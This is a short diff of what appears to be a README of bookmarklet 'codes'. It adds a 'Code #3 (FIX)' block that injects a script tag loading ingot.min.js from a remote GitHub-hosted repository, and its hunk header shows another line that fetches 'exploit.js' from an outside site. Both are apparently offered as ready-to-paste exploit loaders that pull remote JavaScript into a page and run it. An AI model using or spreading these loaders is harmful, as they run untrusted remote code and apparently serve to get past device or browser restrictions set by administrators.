@@ -20,6 +20,10 @@ fetch(`https://tylerhalltech.com/exploit.js`).then(data=>{data.text().then(text=
 (function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot@latest/ingot.min.js';document.body.appendChild(a);}())
 ```
 
+## Code #3 (FIX)
+```
+(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot@latest/ingot.min.js';document.body.appendChild(a);}())
+```
 
 ## 2) LOAD 404 PAGE
 
